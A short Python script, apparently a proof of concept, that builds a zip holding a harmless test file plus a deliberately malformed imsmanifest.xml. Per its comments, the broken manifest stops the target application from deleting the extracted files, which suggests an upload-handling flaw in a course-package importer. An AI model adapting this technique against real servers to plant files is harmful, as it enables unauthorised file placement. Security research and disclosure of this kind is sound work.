import zipfile
from io import BytesIO

def build_zip():
    b = BytesIO()
    z = zipfile.ZipFile(b, 'w', zipfile.ZIP_DEFLATED)

    file = 'poc/test_file.txt' # creates file in zip. IF poc/test_file.txt will create folder and file inside zip
    file_contents = 'asd' # creates contents of test_file.txt
    z.writestr(file, file_contents)
    z.writestr('imsmanifest.xml', 'invalid xml!') # Proper XML causes the files in our zip to be deleted later on. improper stops this.
    z.close()

    zip = open('poc.zip', 'wb') #creates zip that holds the .writestr() files
    zip.write(b.getvalue())
    zip.close()

build_zip()